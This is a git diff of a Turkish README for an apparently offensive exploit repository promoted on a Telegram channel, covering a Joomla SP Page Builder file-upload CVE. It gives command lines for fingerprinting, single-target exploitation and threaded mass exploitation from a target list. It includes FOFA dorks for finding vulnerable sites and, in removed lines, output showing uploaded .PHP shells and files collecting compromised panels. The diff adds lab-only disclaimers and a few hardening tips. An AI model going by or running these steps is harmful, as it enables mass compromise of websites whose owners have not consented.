@@ -38,6 +38,8 @@ Her CVE paylaşımında şunları veriyoruz:
 
 > ⚠️ **Yalnızca yetkili test / kendi lab ortamın.** İzinsiz kullanım yasa dışıdır.
 
+> 🔒 **Gizlilik:** Canlı hedef listeleri, panel/shell URL'leri ve tarama çıktıları **asla paylaşılmaz** — sadece CVE bilgisi, fix ve genel kullanım örneği.
+
 📡 **Telegram:** [winrarzipsexploit](https://t.me/winrarzipsteam)
 
 ---
@@ -87,55 +89,39 @@ Her yeni CVE Telegram'da ve burada şu formatta:
 3. **AllowOverride** kapalı tut — `.htaccess` ile PHP register edilemesin
 4. WAF: `custom_icon` ZIP upload POST'unu rate-limit / Imunify rule
 
-#### 🎯 Tek hedef tarama
+#### 🎯 Tek hedef (kendi lab / izinli pentest)
 
 ```bash
-# Fingerprint
-python CVE-2026-48908-Suite.py -u https://hedef.com --fingerprint
+# Sürüm & bileşen kontrolü
+python CVE-2026-48908-Suite.py -u https://lab.example.com --fingerprint
 
-# Tek hedef exploit (yetkili lab)
-python CVE-2026-48908-Suite.py -u https://hedef.com --yes
+# PoC doğrulama (sadece yetkili ortam)
+python CVE-2026-48908-Suite.py -u https://lab.example.com --yes
 ```
 
-Beklenen çıktı:
+Örnek **hata sınıfları** (gerçek URL / panel linki paylaşılmaz):
 
 ```
-[+] https://hedef.com -> https://hedef.com/media/.../fonts/xxxxx.PHP
-[-] https://hedef.com -> patched_662_plus    # güncel
-[-] https://hedef.com -> upload_rejected     # filter/WAF
-[-] https://hedef.com -> waf_cloudflare      # WAF
+[-] https://lab.example.com -> patched_662_plus     # güncel, admin ister
+[-] https://lab.example.com -> upload_rejected      # filter reddetti
+[-] https://lab.example.com -> waf_cloudflare       # WAF
+[-] https://lab.example.com -> sppb_html_no_json    # endpoint yok / HTML
+[-] https://lab.example.com -> upload_server_failed # sunucu upload kırık
 ```
 
-#### 📦 Toplu tarama (FOFA / domain listesi)
+#### 📦 Toplu tarama (yalnızca kendi listende)
 
-**FOFA dork:**
-```
-body="com_sppagebuilder"
-body="/media/com_sppagebuilder/"
-```
-
-**Batch:**
 ```bash
+# targets.txt = SENİN oluşturduğun izinli hedef listesi (paylaşılmaz)
 python CVE-2026-48908-Suite.py -f targets.txt --yes --threads 15
 ```
 
-`targets.txt` → her satırda bir root URL (`https://site.com`)
+**FOFA recon dork** (genel arama, domain listesi değil):
+```
+body="com_sppagebuilder"
+```
 
-Sonuç dosyaları:
-- `panels_48908.txt` — verify OK paneller
-- `uploads_ok.txt` — upload OK, manuel doğrula
-
----
-
-### 📂 Paylaşılan CVE Suite'ler
-
-| CVE | Ürün | Durum |
-|-----|------|-------|
-| CVE-2026-48908 | Joomla SP Page Builder | ✅ Paylaşıldı |
-| CVE-2026-48907 | JCE (Joomla) | 🔜 Yakında |
-| CVE-2026-87930 | Joomla multi-plugin chain | 🔜 Yakında |
-
-> Yeni CVE suite'ler önce [Telegram](https://t.me/winrarzipsteam)'da duyurulur, ardından repo linki eklenir.
+> ❌ Hedef domain listesi, hit listesi veya canlı panel URL'leri Telegram/GitHub'da **yayınlanmaz**.
 
 ---
 
